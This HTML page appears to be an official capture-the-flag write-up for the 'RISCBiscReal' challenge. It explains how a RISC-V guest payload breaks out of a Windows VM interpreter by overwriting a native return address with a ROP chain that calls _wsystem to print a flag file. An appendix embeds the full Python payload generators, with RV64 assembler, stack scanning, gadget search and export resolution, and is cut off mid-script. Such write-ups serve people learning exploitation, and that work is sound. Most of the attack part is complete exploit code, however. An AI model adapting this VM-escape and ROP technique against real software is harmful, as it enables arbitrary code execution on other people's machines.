@@ -1,0 +1,2371 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>RISCBiscReal Official Write-up Report</title>
+  <meta name="description" content="Formal exploit report for the RV64-to-Windows x64 ROP payload that prints C:\chall\flag.txt via _wsystem.">
+  <style>
+:root {
+  --bg: #f5f2ea;
+  --paper: #fffdf8;
+  --ink: #171915;
+  --muted: #62685e;
+  --line: #d7d1c4;
+  --code: #111713;
+  --codeText: #eef8f0;
+  --red: #a9362d;
+  --green: #08745d;
+  --blue: #1e5aa8;
+  --gold: #a96700;
+  --soft: #ece7da;
+  --shadow: 0 18px 48px rgba(23, 25, 21, .10);
+  --sans: Aptos, "Segoe UI", Tahoma, sans-serif;
+  --mono: "Cascadia Mono", "JetBrains Mono", Consolas, monospace;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0;
+  color: var(--ink);
+  background:
+    linear-gradient(90deg, rgba(23,25,21,.04) 1px, transparent 1px) 0 0/44px 44px,
+    linear-gradient(0deg, rgba(23,25,21,.04) 1px, transparent 1px) 0 0/44px 44px,
+    radial-gradient(circle at 8% 6%, rgba(30,90,168,.10), transparent 28rem),
+    radial-gradient(circle at 96% 12%, rgba(8,116,93,.12), transparent 30rem),
+    var(--bg);
+  font-family: var(--sans);
+  line-height: 1.68;
+}
+.progress { position: fixed; inset: 0 0 auto 0; height: 4px; z-index: 90; }
+.progress span { display: block; width: 0; height: 100%; background: linear-gradient(90deg, var(--red), var(--gold), var(--green), var(--blue)); }
+.hero {
+  min-height: 46vh;
+  display: grid;
+  align-items: end;
+  color: #fffdf8;
+  background:
+    linear-gradient(135deg, rgba(19,23,20,.96), rgba(19,23,20,.82)),
+    repeating-linear-gradient(90deg, rgba(255,255,255,.08) 0 1px, transparent 1px 76px),
+    repeating-linear-gradient(0deg, rgba(255,255,255,.06) 0 1px, transparent 1px 76px);
+  border-bottom: 1px solid rgba(23,25,21,.20);
+}
+.heroInner, .layout, .footer { width: min(1180px, calc(100% - 32px)); margin: 0 auto; }
+.heroInner { padding: 70px 0 54px; }
+.kicker { display: inline-flex; direction: ltr; border: 1px solid rgba(255,255,255,.28); border-radius: 999px; padding: 7px 12px; color: #dff8ef; background: rgba(255,255,255,.08); font: 800 12px/1 var(--mono); }
+h1 { max-width: 980px; margin: 22px 0 16px; font-size: clamp(38px, 7vw, 78px); line-height: 1.04; letter-spacing: 0; }
+.hero p { max-width: 780px; margin: 0; color: rgba(255,253,248,.84); font-size: clamp(17px, 2.1vw, 22px); }
+.tags { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 24px; }
+.tag { display: inline-flex; align-items: center; min-height: 34px; border: 1px solid rgba(255,255,255,.24); border-radius: 999px; padding: 5px 11px; background: rgba(255,255,255,.08); font-size: 13px; font-weight: 800; white-space: nowrap; }
+.layout { display: grid; grid-template-columns: minmax(0, 1fr) 280px; gap: 28px; padding: 38px 0 72px; }
+main { display: grid; gap: 28px; }
+aside { position: sticky; top: 22px; align-self: start; border: 1px solid var(--line); border-radius: 8px; padding: 18px; background: rgba(255,253,248,.86); box-shadow: var(--shadow); backdrop-filter: blur(14px); }
+aside strong { display: block; margin-bottom: 10px; color: var(--muted); font-size: 14px; }
+.toc { display: grid; gap: 4px; margin: 0; padding: 0; list-style: none; }
+.toc a { display: block; border-radius: 6px; padding: 8px 10px; color: var(--muted); text-decoration: none; font-size: 14px; line-height: 1.42; }
+.toc a:hover, .toc a.active { color: var(--ink); background: #dfeee7; }
+section { border: 1px solid var(--line); border-radius: 8px; padding: clamp(22px, 4vw, 40px); background: rgba(255,253,248,.95); box-shadow: var(--shadow); }
+h2 { margin: 0 0 18px; padding-bottom: 16px; border-bottom: 1px solid var(--line); font-size: clamp(28px, 4vw, 42px); line-height: 1.16; letter-spacing: 0; }
+h3 { margin: 30px 0 12px; font-size: clamp(20px, 2.3vw, 28px); line-height: 1.28; letter-spacing: 0; }
+p { margin: 0 0 15px; color: #30362f; font-size: 17px; }
+ul, ol { margin: 0 0 18px; padding-left: 24px; }
+li { margin: 7px 0; }
+code { display: inline-block; direction: ltr; border: 1px solid #d8d1c4; border-radius: 5px; padding: 1px 5px; background: #ede8dc; font-family: var(--mono); font-size: .92em; line-height: 1.5; }
+.cards { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; margin: 20px 0; }
+.metric { min-height: 112px; border: 1px solid var(--line); border-radius: 8px; padding: 14px; background: linear-gradient(180deg, #fffdf8, #f1f4ec); }
+.metric span { display: block; color: var(--muted); font: 800 12px/1 var(--mono); margin-bottom: 9px; }
+.metric b { display: block; font-size: 21px; line-height: 1.28; overflow-wrap: anywhere; }
+.note { margin: 18px 0; border: 1px solid var(--line); border-left: 5px solid var(--green); border-radius: 8px; padding: 16px; background: #fbfff9; }
+.note b { display: block; margin-bottom: 7px; }
+.flow { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; margin: 20px 0; }
+.node { min-height: 124px; border: 1px solid var(--line); border-radius: 8px; padding: 14px; background: linear-gradient(180deg, #fffdf8, #f2f6ee); }
+.node span { display: block; direction: ltr; margin-bottom: 8px; color: var(--blue); font: 800 12px/1 var(--mono); }
+.node b { display: block; margin-bottom: 6px; font-size: 17px; line-height: 1.4; }
+table { width: 100%; margin: 18px 0; border-collapse: collapse; overflow: hidden; border: 1px solid var(--line); border-radius: 8px; background: #fffdf8; }
+th, td { border-bottom: 1px solid var(--line); padding: 12px 13px; text-align: left; vertical-align: top; }
+th { background: #ede8dc; color: var(--ink); }
+tr:last-child td { border-bottom: 0; }
+.hash, .ltr { direction: ltr; text-align: left; font-family: var(--mono); overflow-wrap: anywhere; }
+.codebox { position: relative; margin: 16px 0 22px; }
+pre { margin: 0; overflow-x: auto; direction: ltr; text-align: left; border: 1px solid #313a34; border-radius: 8px; padding: 18px; color: var(--codeText); background: linear-gradient(90deg, rgba(169,54,45,.17), transparent 34%), var(--code); font: 13px/1.62 var(--mono); tab-size: 4; box-shadow: inset 0 1px 0 rgba(255,255,255,.07); }
+pre code { display: block; border: 0; border-radius: 0; padding: 0; color: inherit; background: transparent; white-space: pre; font-size: inherit; line-height: inherit; }
+.copy { position: absolute; top: 10px; right: 10px; min-width: 56px; min-height: 31px; border: 1px solid rgba(255,255,255,.22); border-radius: 6px; color: #fffdf8; background: rgba(255,255,255,.10); font: 800 12px/1 var(--mono); cursor: pointer; }
+.copy:hover { background: rgba(255,255,255,.18); }
+.flag { display: block; width: 100%; overflow-x: auto; direction: ltr; text-align: left; border: 1px solid rgba(8,116,93,.32); border-radius: 8px; padding: 17px 18px; color: #dffff0; background: linear-gradient(135deg, #10221d, #153a30); font: 800 16px/1.65 var(--mono); }
+details.file { margin: 14px 0; overflow: hidden; border: 1px solid var(--line); border-radius: 8px; background: #fffdf8; }
+details.file summary { cursor: pointer; list-style: none; padding: 13px 15px; background: #ede8dc; font-weight: 800; display: flex; justify-content: space-between; gap: 12px; align-items: center; }
+details.file summary::-webkit-details-marker { display: none; }
+.meta { color: var(--muted); direction: ltr; font: 800 12px/1 var(--mono); }
+details.file .codebox { margin: 0; }
+details.file pre { border: 0; border-radius: 0; max-height: 720px; }
+.footer { margin-bottom: 34px; border-top: 1px solid var(--line); padding-top: 18px; color: var(--muted); font-size: 14px; }
+@media (max-width: 980px) { .layout { grid-template-columns: 1fr; } aside { position: relative; top: auto; order: -1; } .toc { grid-template-columns: repeat(2, minmax(0, 1fr)); } .cards, .flow { grid-template-columns: 1fr; } }
+@media (max-width: 560px) { .heroInner, .layout, .footer { width: min(100% - 20px, 1180px); } h1 { font-size: 34px; } section { padding: 18px; } .toc { grid-template-columns: 1fr; } pre { font-size: 12px; padding: 15px 12px; } .copy { position: static; margin-bottom: 8px; color: var(--ink); border-color: var(--line); background: #ede8dc; } details.file summary { display: block; } .meta { display: block; margin-top: 8px; } }
+@media print { body { background: #fff; } .progress, aside, .copy { display: none; } .hero { min-height: auto; color: #000; background: #fff; } .layout { display: block; } section { box-shadow: none; break-inside: avoid; } details.file pre { max-height: none; } }
+</style>
+</head>
+<body>
+  <div class="progress" aria-hidden="true"><span id="progressBar"></span></div>
+  <header class="hero">
+    <div class="heroInner">
+      <span class="kicker">OmniCTF / pwn / windows / risc-v</span>
+      <h1>RISCBiscReal Official Write-up Report</h1>
+      <p>Formal exploit report for the RV64-to-Windows x64 ROP payload that prints C:\chall\flag.txt via _wsystem.</p>
+      <div class="tags"><span class="tag">Windows x64 ROP</span><span class="tag">RV64IM</span><span class="tag">_wsystem</span><span class="tag">dynamic export scan</span><span class="tag">TLS submission</span></div>
+    </div>
+  </header>
+  <div class="layout">
+    <main><section id="summary"><h2>Executive Summary</h2>
+<p><strong>RISCBiscReal</strong> is solved by extending the same VM memory primitive from process-memory reading to native control-flow redirection. The challenge states that the flag is located at <code>C:\chall\flag.txt</code>, so the exploit must cause the Windows process to read or print that file.</p>
+<p>The final payload dynamically locates the VM context, finds the native interpreter return slot, resolves a <code>pop rcx; ret</code> gadget, resolves <code>_wsystem</code> from loaded CRT exports, writes a UTF-16 command string, and returns into a short Windows x64 ROP chain that executes <code>type C:\chall\flag.txt</code>.</p>
+<div class="cards">
+  <div class="metric"><span>VULNERABILITY</span><b>Guest write to native process memory</b></div>
+  <div class="metric"><span>PAYLOAD</span><b>sol/real_wsystem.bin</b></div>
+  <div class="metric"><span>REMOTE FLAG</span><b>OmniCTF{4llIn_Du3_T1me!-ash9+ujdsmnA1}</b></div>
+</div>
+</section><section id="challenge"><h2>Challenge Information</h2>
+<table>
+  <tbody>
+    <tr><th>Name</th><td>RISCBiscReal</td></tr>
+    <tr><th>Category</th><td>Binary Exploitation / pwn / Windows / RISC-V</td></tr>
+    <tr><th>Target File</th><td><code>C:\chall\flag.txt</code></td></tr>
+    <tr><th>Submission Interface</th><td>Base64-encoded payload over TLS</td></tr>
+    <tr><th>Execution Model</th><td>RV64IM guest code executed by <code>RV64VMv4.exe</code>.</td></tr>
+  </tbody>
+</table>
+</section><section id="tools"><h2>Tools and Environment</h2>
+<ul>
+  <li>Windows PowerShell for local validation and remote execution.</li>
+  <li>The challenge VM: <code>RISC It for the Biscuit\RV64VMv4.exe</code>.</li>
+  <li>The local wrapper: <code>RISC It for the Biscuit\SocketHandler.py</code>.</li>
+  <li>Python payload generators for emitting RV64 instructions and embedding the final ROP chain.</li>
+  <li><code>solve_ssl.py</code> or <code>ncat --ssl</code> for TLS submission.</li>
+  <li>Optional PE/gadget tooling such as Ghidra, IDA, CFF Explorer, PE-bear, or <code>dumpbin</code>.</li>
+</ul>
+</section><section id="analysis"><h2>Vulnerability Analysis</h2>
+<p>The VM's guest memory accesses are native process memory accesses. For this challenge, reading strings from the VM image is not sufficient because the flag is stored on disk. The same primitive can also write into host memory, which allows a native control-flow hijack by replacing the interpreter's saved return address.</p>
+<p>Windows x64 calling convention places the first argument in <code>rcx</code>. A call to <code>_wsystem(L"type C:\\chall\\flag.txt")</code> therefore requires only one controlled argument. This minimizes gadget requirements while still causing the process to print the target file to stdout.</p>
+<div class="note"><b>Design objective</b>Resolve all required native addresses dynamically and keep the final ROP chain as small as possible.</div>
+</section><section id="design"><h2>Exploit Design</h2>
+<div class="flow">
+  <div class="node"><span>01</span><b>Discover context</b>Recover the VM context from the payload location using RV64 code.</div>
+  <div class="node"><span>02</span><b>Find return slot</b>Scan process memory for the native interpreter stack frame and saved return address.</div>
+  <div class="node"><span>03</span><b>Resolve native targets</b>Find <code>pop rcx; ret</code> and resolve <code>_wsystem</code> from PE exports.</div>
+  <div class="node"><span>04</span><b>Execute command</b>Write the command string and return into the ROP chain.</div>
+</div>
+<p>The ROP chain written over the interpreter return slot is:</p>
+<div class="codebox"><pre><code class="language-text">ret
+pop rcx; ret
+&amp;L&quot;type C:\chall\flag.txt&quot;
+_wsystem
+0
+0 0 0 0
+</code></pre></div>
+<p>The command string is written as UTF-16LE because <code>_wsystem</code> consumes a wide-character command string:</p>
+<div class="codebox"><pre><code class="language-python">data = &quot;type C:\\chall\\flag.txt&quot;.encode(&quot;utf-16le&quot;) + b&quot;\x00\x00&quot;
+</code></pre></div></section><section id="implementation"><h2>Implementation Details</h2>
+<p>The final generator is <code>make_real_wsystem.py</code>. It reuses helper routines from the included support modules to assemble RV64 instructions, locate context memory, scan PE sections, and resolve exports.</p>
+<ol>
+  <li><code>emit_common_discovery</code> locates the VM context, native stack frame, return slot, and relevant module base.</li>
+  <li><code>parse_first_section</code> and <code>scan_pattern</code> scan executable code for <code>pop rcx; ret</code>.</li>
+  <li><code>emit_find_export</code> walks loaded PE export tables until it resolves <code>_wsystem</code>.</li>
+  <li><code>write_wide_string</code> stores <code>type C:\chall\flag.txt</code> in writable process memory.</li>
+  <li>The payload writes the ROP chain at the native return slot and triggers the VM exit syscall.</li>
+</ol>
+</section><section id="artifacts"><h2>Payload Artifacts</h2>
+<table>
+  <tbody>
+    <tr><th>Final binary</th><td><code>sol/real_wsystem.bin</code></td></tr>
+    <tr><th>Binary size</th><td>2876 bytes</td></tr>
+    <tr><th>Binary SHA256</th><td class="hash">920AE435ABAB5A92D587FD27AB1536118A54051E218B080E64E2907EA6479823</td></tr>
+    <tr><th>Base64 artifact</th><td><code>sol/real_wsystem.b64</code></td></tr>
+    <tr><th>Base64 matches binary</th><td>yes</td></tr>
+  </tbody>
+</table>
+</section><section id="local"><h2>Local Validation</h2><div class="codebox"><pre><code class="language-powershell">python .\make_real_wsystem.py
+</code></pre></div><div class="codebox"><pre><code class="language-text">wrote sol\real_wsystem.bin (2876 bytes)
+wrote sol\real_wsystem.b64 (3836 bytes base64)
+</code></pre></div><div class="codebox"><pre><code class="language-powershell">Set-Content -NoNewline -Encoding ascii &quot;.\RISC It for the Biscuit\.flag_pattern&quot; &quot;OmniCTF{&quot;
+Get-Content .\sol\real_wsystem.b64 -Raw | python &quot;.\RISC It for the Biscuit\SocketHandler.py&quot;
+</code></pre></div><div class="codebox"><pre><code class="language-text">Enter payload encoded in Base64: [*] Decoding and writing to exploit.bin...
+[*] Raw payload size: 2876
+OmniCTF{LOCAL_RISCBISCREAL_TEST}
+</code></pre></div></section><section id="remote"><h2>Remote Execution</h2><div class="codebox"><pre><code class="language-powershell">python .\solve_ssl.py ristbiscreal-3bc8bd3eca22.inst.omnictf.com 1337 8
+</code></pre></div><div class="codebox"><pre><code class="language-text">payload=sol\real_wsystem.bin bytes=2876
+--- attempt 1/8 ---
+Enter payload encoded in Base64: [*] Decoding and writing to exploit.bin...
+[*] Raw payload size: 2876
+OmniCTF{4llIn_Du3_T1me!-ash9+ujdsmnA1}
+
+FLAG=OmniCTF{4llIn_Du3_T1me!-ash9+ujdsmnA1}
+</code></pre></div><span class="flag">OmniCTF{4llIn_Du3_T1me!-ash9+ujdsmnA1}</span></section><section id="appendix"><h2>Appendix: Complete Scripts and Payload</h2>
+<p>This section embeds the complete generator, helper modules, sender, local wrapper, and final Base64 payload used for this challenge.</p>
+
+<details class="file">
+  <summary><span>make_real_wsystem.py</span><span class="meta">2,445 bytes / SHA256 91BCA6BE74B932FC...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+from pathlib import Path
+
+from make_real_rop import (
+    A7,
+    S0,
+    S4,
+    S6,
+    S7,
+    T0,
+    X0,
+    Asm,
+    add,
+    add_large,
+    addi,
+    li,
+    store_const,
+    store_inc,
+)
+from make_real_rop_dynamic import (
+    SLOT_POP_RCX,
+    SLOT_RET_ALIGN,
+    parse_first_section,
+    scan_pattern,
+)
+from make_real_universal import emit_find_export
+from make_real_vp_shell import emit_common_discovery, load_from_ctx, store_at_ctx
+
+
+SLOT_WSYSTEM = 0x38
+
+
+def write_wide_string(a, base_reg, text):
+    data = text.encode(&quot;utf-16le&quot;) + b&quot;\x00\x00&quot;
+    data += b&quot;\x00&quot; * ((8 - len(data) % 8) % 8)
+    add(a, S4, base_reg, X0)
+    for i in range(0, len(data), 8):
+        store_const(a, int.from_bytes(data[i : i + 8], &quot;little&quot;))
+
+
+def build():
+    a = Asm()
+    emit_common_discovery(a)
+
+    # Resolve the only ROP gadget needed from shell32 .text.
+    parse_first_section(a, S7, 10, 11)  # a0=text_base, a1=text_size
+    scan_pattern(a, &quot;ws_pop_rcx&quot;, 10, 11, bytes.fromhex(&quot;59 c3&quot;), SLOT_POP_RCX, {&quot;slot_base&quot;: 0x2400}, &quot;fail&quot;)
+    load_from_ctx(a, T0, 0x2400 + SLOT_POP_RCX)
+    addi(a, T0, T0, 1)
+    store_at_ctx(a, T0, 0x2400 + SLOT_RET_ALIGN)
+
+    # Resolve ucrtbase!_wsystem (or any loaded CRT exporting it).
+    emit_find_export(a, &quot;_wsystem&quot;, 0x2400 + SLOT_WSYSTEM)
+
+    add_large(a, S7, S0, 0x2600)
+    write_wide_string(a, S7, &quot;type C:\\chall\\flag.txt&quot;)
+
+    add(a, S4, S6, X0)
+    load_from_ctx(a, T0, 0x2400 + SLOT_RET_ALIGN)
+    store_inc(a, T0)
+    load_from_ctx(a, T0, 0x2400 + SLOT_POP_RCX)
+    store_inc(a, T0)
+    store_inc(a, S7)
+    load_from_ctx(a, T0, 0x2400 + SLOT_WSYSTEM)
+    store_inc(a, T0)
+    # Return address + shadow space for _wsystem. Crashing after output is OK.
+    for _ in range(5):
+        store_const(a, 0)
+    a.jal(X0, &quot;trigger&quot;)
+
+    a.label(&quot;fail&quot;)
+    li(a, A7, 0x5D)
+    a.emit(0x00000073)
+    addi(a, X0, X0, 0)
+
+    a.label(&quot;trigger&quot;)
+    li(a, A7, 0x5D)
+    a.emit(0x00000073)
+    addi(a, X0, X0, 0)
+    return a.resolve()
+
+
+def main():
+    payload = build()
+    out = Path(&quot;sol&quot;)
+    out.mkdir(exist_ok=True)
+    (out / &quot;real_wsystem.bin&quot;).write_bytes(payload)
+    (out / &quot;real_wsystem.b64&quot;).write_text(base64.b64encode(payload).decode(), newline=&quot;&quot;)
+    print(f&quot;wrote sol\\real_wsystem.bin ({len(payload)} bytes)&quot;)
+    print(f&quot;wrote sol\\real_wsystem.b64 ({len(base64.b64encode(payload))} bytes base64)&quot;)
+
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre></div>
+</details>
+<details class="file">
+  <summary><span>make_real_rop.py</span><span class="meta">17,037 bytes / SHA256 F3BF5F9CA8E3EE02...</span></summary>
+  <div class="codebox"><pre><code class="language-py">#!/usr/bin/env python3
+import base64
+import os
+import struct
+from pathlib import Path
+
+
+X0 = 0
+RA = 1
+SP = 2
+T0, T1, T2 = 5, 6, 7
+S0, S1 = 8, 9
+A0, A1, A2, A3, A4, A5, A6, A7 = range(10, 18)
+S2, S3, S4, S5, S6, S7, S8, S9, S10, S11 = range(18, 28)
+T3, T4, T5, T6 = 28, 29, 30, 31
+
+
+class Asm:
+    def __init__(self):
+        self.items = []
+
+    def label(self, name):
+        self.items.append((&quot;label&quot;, name))
+
+    def emit(self, word):
+        self.items.append((&quot;word&quot;, word))
+
+    def branch(self, kind, rs1, rs2, label):
+        self.items.append((&quot;branch&quot;, kind, rs1, rs2, label))
+
+    def jal(self, rd, label):
+        self.items.append((&quot;jal&quot;, rd, label))
+
+    def resolve(self):
+        items = list(self.items)
+        inverse = {
+            &quot;beq&quot;: &quot;bne&quot;,
+            &quot;bne&quot;: &quot;beq&quot;,
+            &quot;blt&quot;: &quot;bge&quot;,
+            &quot;bge&quot;: &quot;blt&quot;,
+            &quot;bltu&quot;: &quot;bgeu&quot;,
+            &quot;bgeu&quot;: &quot;bltu&quot;,
+        }
+        uid = 0
+
+        # B-type branches are limited to +/-4 KiB. Expand far conditional
+        # branches into inverse-branch-over-jal + jal target.
+        while True:
+            labels = {}
+            pc = 0
+            for item in items:
+                if item[0] == &quot;label&quot;:
+                    labels[item[1]] = pc
+                else:
+                    pc += 4
+
+            changed = False
+            new_items = []
+            pc = 0
+            for item in items:
+                if item[0] == &quot;branch&quot;:
+                    _, kind, rs1, rs2, label = item
+                    off = labels[label] - pc
+                    if off &lt; -4096 or off &gt; 4094:
+                        skip = f&quot;__long_branch_{uid}&quot;
+                        uid += 1
+                        new_items.append((&quot;branch&quot;, inverse[kind], rs1, rs2, skip))
+                        new_items.append((&quot;jal&quot;, X0, label))
+                        new_items.append((&quot;label&quot;, skip))
+                        changed = True
+                        pc += 8
+                        continue
+                new_items.append(item)
+                if item[0] != &quot;label&quot;:
+                    pc += 4
+            items = new_items
+            if not changed:
+                break
+
+        labels = {}
+        pc = 0
+        for item in items:
+            if item[0] == &quot;label&quot;:
+                labels[item[1]] = pc
+            else:
+                pc += 4
+
+        out = []
+        pc = 0
+        f3 = {&quot;beq&quot;: 0, &quot;bne&quot;: 1, &quot;blt&quot;: 4, &quot;bge&quot;: 5, &quot;bltu&quot;: 6, &quot;bgeu&quot;: 7}
+        for item in items:
+            if item[0] == &quot;label&quot;:
+                continue
+            if item[0] == &quot;word&quot;:
+                out.append(item[1])
+            elif item[0] == &quot;branch&quot;:
+                _, kind, rs1, rs2, label = item
+                out.append(enc_b(labels[label] - pc, rs1, rs2, f3[kind]))
+            elif item[0] == &quot;jal&quot;:
+                _, rd, label = item
+                out.append(enc_j(labels[label] - pc, rd))
+            pc += 4
+        return b&quot;&quot;.join(struct.pack(&quot;&lt;I&quot;, w &amp; 0xFFFFFFFF) for w in out)
+
+
+def enc_r(f7, rs2, rs1, f3, rd, opc=0x33):
+    return (f7 &lt;&lt; 25) | (rs2 &lt;&lt; 20) | (rs1 &lt;&lt; 15) | (f3 &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_i(imm, rs1, f3, rd, opc=0x13):
+    return ((imm &amp; 0xFFF) &lt;&lt; 20) | (rs1 &lt;&lt; 15) | (f3 &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_s(imm, rs2, rs1, f3):
+    return (((imm &gt;&gt; 5) &amp; 0x7F) &lt;&lt; 25) | (rs2 &lt;&lt; 20) | (rs1 &lt;&lt; 15) | (f3 &lt;&lt; 12) | ((imm &amp; 0x1F) &lt;&lt; 7) | 0x23
+
+
+def enc_b(off, rs1, rs2, f3):
+    return (
+        (((off &gt;&gt; 12) &amp; 1) &lt;&lt; 31)
+        | (((off &gt;&gt; 5) &amp; 0x3F) &lt;&lt; 25)
+        | (rs2 &lt;&lt; 20)
+        | (rs1 &lt;&lt; 15)
+        | (f3 &lt;&lt; 12)
+        | (((off &gt;&gt; 1) &amp; 0xF) &lt;&lt; 8)
+        | (((off &gt;&gt; 11) &amp; 1) &lt;&lt; 7)
+        | 0x63
+    )
+
+
+def enc_u(imm20, rd, opc):
+    return ((imm20 &amp; 0xFFFFF) &lt;&lt; 12) | (rd &lt;&lt; 7) | opc
+
+
+def enc_j(off, rd):
+    return (
+        (((off &gt;&gt; 20) &amp; 1) &lt;&lt; 31)
+        | (((off &gt;&gt; 1) &amp; 0x3FF) &lt;&lt; 21)
+        | (((off &gt;&gt; 11) &amp; 1) &lt;&lt; 20)
+        | (((off &gt;&gt; 12) &amp; 0xFF) &lt;&lt; 12)
+        | (rd &lt;&lt; 7)
+        | 0x6F
+    )
+
+
+def add(a, rd, rs1, rs2):
+    a.emit(enc_r(0, rs2, rs1, 0, rd))
+
+
+def sub(a, rd, rs1, rs2):
+    a.emit(enc_r(0x20, rs2, rs1, 0, rd))
+
+
+def addi(a, rd, rs1, imm):
+    a.emit(enc_i(imm, rs1, 0, rd))
+
+
+def slli(a, rd, rs1, sh):
+    a.emit(enc_i(sh, rs1, 1, rd))
+
+
+def srli(a, rd, rs1, sh):
+    a.emit(enc_i(sh, rs1, 5, rd))
+
+
+def load(a, kind, rd, rs1, imm):
+    f3 = {&quot;lbu&quot;: 4, &quot;lhu&quot;: 5, &quot;lw&quot;: 2, &quot;lwu&quot;: 6, &quot;ld&quot;: 3}[kind]
+    a.emit(enc_i(imm, rs1, f3, rd, 0x03))
+
+
+def store(a, kind, rs2, rs1, imm):
+    f3 = {&quot;sb&quot;: 0, &quot;sh&quot;: 1, &quot;sw&quot;: 2, &quot;sd&quot;: 3}[kind]
+    a.emit(enc_s(imm, rs2, rs1, f3))
+
+
+def auipc(a, rd, imm20):
+    a.emit(enc_u(imm20, rd, 0x17))
+
+
+def li(a, rd, val):
+    val &amp;= 0xFFFFFFFFFFFFFFFF
+    addi(a, rd, X0, 0)
+    if val == 0:
+        return
+    for ch in f&quot;{val:x}&quot;:
+        slli(a, rd, rd, 4)
+        addi(a, rd, rd, int(ch, 16))
+
+
+def add_large(a, rd, base, off):
+    if off == 0:
+        add(a, rd, base, X0)
+    elif off &lt; 0:
+        li(a, T6, -off)
+        sub(a, rd, base, T6)
+    else:
+        li(a, T6, off)
+        add(a, rd, base, T6)
+
+
+def store_inc(a, src):
+    store(a, &quot;sd&quot;, src, S4, 0)
+    addi(a, S4, S4, 8)
+
+
+def store_const(a, val):
+    li(a, T0, val)
+    store_inc(a, T0)
+
+
+def store_add_base(a, base, off):
+    add_large(a, T0, base, off)
+    store_inc(a, T0)
+
+
+def store_loaded_iat(a, main_base, rva):
+    add_large(a, T0, main_base, rva)
+    load(a, &quot;ld&quot;, T0, T0, 0)
+    store_inc(a, T0)
+
+
+def store_reg_at_ctx(a, src, off):
+    add_large(a, T0, S0, off)
+    store(a, &quot;sd&quot;, src, T0, 0)
+
+
+def store_ctx_slot_inc(a, off):
+    add_large(a, T0, S0, off)
+    load(a, &quot;ld&quot;, T0, T0, 0)
+    store_inc(a, T0)
+
+
+def scan_pattern(a, name, base_reg, size_reg, pattern, slot_off, extra_found=None):
+    if os.environ.get(&quot;DYNAMIC_SHELL&quot;) != &quot;1&quot;:
+        return
+
+    loop = f&quot;scan_{name}&quot;
+    next_label = f&quot;next_{name}&quot;
+    found = f&quot;found_{name}&quot;
+
+    add(a, S11, base_reg, X0)
+    add(a, A6, base_reg, size_reg)
+    add_large(a, A6, A6, -len(pattern))
+
+    a.label(loop)
+    a.branch(&quot;bgeu&quot;, S11, A6, &quot;fail&quot;)
+    for i, byte in enumerate(pattern):
+        load(a, &quot;lbu&quot;, T0, S11, i)
+        li(a, T1, byte)
+        a.branch(&quot;bne&quot;, T0, T1, next_label)
+    store_reg_at_ctx(a, S11, slot_off)
+    if extra_found:
+        extra_found(a)
+    a.jal(X0, found)
+
+    a.label(next_label)
+    addi(a, S11, S11, 1)
+    a.jal(X0, loop)
+    a.label(found)
+
+
+def build(spin_after_write=False, mode=&quot;real&quot;):
+    a = Asm()
+
+    # s0 = VM context; payload starts at context+0x110.
+    auipc(a, S0, 0)
+    addi(a, S0, S0, -0x110)
+
+    # Heap metadata in the 64 KiB chunk below ctx contains several pointers
+    # into the native main-thread stack.  The exact slot moves with payload
+    # contents/size, so scan the metadata window and validate candidates by
+    # looking for the interpreter return frame: ctx, main+0x1ccc, ctx.
+    srli(a, S2, S0, 16)
+    slli(a, S2, S2, 16)
+    add_large(a, S11, S2, -0x7000)  # metadata cursor
+    add_large(a, S6, S2, -0x1000)   # metadata end
+
+    a.label(&quot;stack_candidate&quot;)
+    a.branch(&quot;bgeu&quot;, S11, S6, &quot;fail&quot;)
+    load(a, &quot;ld&quot;, S1, S11, 0)
+    addi(a, S11, S11, 8)
+
+    # Reject small integers, unaligned values, module pointers, and pointers
+    # back into the VM heap chunk before dereferencing the candidate page.
+    srli(a, T0, S1, 36)
+    a.branch(&quot;beq&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 44)
+    a.branch(&quot;bne&quot;, T0, X0, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 3)
+    slli(a, T0, T0, 3)
+    a.branch(&quot;bne&quot;, T0, S1, &quot;stack_candidate&quot;)
+    srli(a, T0, S1, 40)
+    li(a, T1, 0x7F)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    srli(a, S1, S1, 12)
+    slli(a, S1, S1, 12)           # candidate page
+    srli(a, T0, S1, 32)
+    srli(a, T1, S2, 32)
+    a.branch(&quot;beq&quot;, T0, T1, &quot;stack_candidate&quot;)
+    add_large(a, T0, S2, -0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;candidate_page_ok&quot;)
+    add_large(a, T0, S2, 0x30000)
+    a.branch(&quot;bltu&quot;, S1, T0, &quot;stack_candidate&quot;)
+
+    a.label(&quot;candidate_page_ok&quot;)
+
+    # Find the interpreter return slot (main_base+0x1ccc) on the stack page.
+    add(a, S3, S1, X0)            # scan cursor
+    add_large(a, S4, S1, 0x1000)  # scan end
+
+    a.label(&quot;stack_scan&quot;)
+    a.branch(&quot;bgeu&quot;, S3, S4, &quot;stack_candidate&quot;)
+    load(a, &quot;ld&quot;, T0, S3, 0)
+    add_large(a, T1, T0, -0x1CCC)  # candidate main module base
+
+    srli(a, T2, T1, 40)
+    li(a, T3, 0x7F)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_stack&quot;)
+    srli(a, T2, T1, 16)
+    slli(a, T2, T2, 16)
+    a.branch(&quot;bne&quot;, T1, T2, &quot;next_stack&quot;)
+    load(a, &quot;lhu&quot;, T2, T1, 0)
+    li(a, T3, 0x5A4D)
+    a.branch(&quot;bne&quot;, T2, T3, &quot;next_stack&quot;)
+    load(a, &quot;lwu&quot;, T2, T1, 0x3C)
+    li(a, T3, 0x1000)
+    a.branch(&quot;bgeu&quot;, T2, T3, &quot;next_stack&quot;)
+    add(a, T3, T1, T2)
+    load(a, &quot;lwu&quot;, T4, T3, 0)
+    li(a, T5, 0x4550)
+    a.branch(&quot;bne&quot;, T4, T5, &quot;next_stack&quot;)
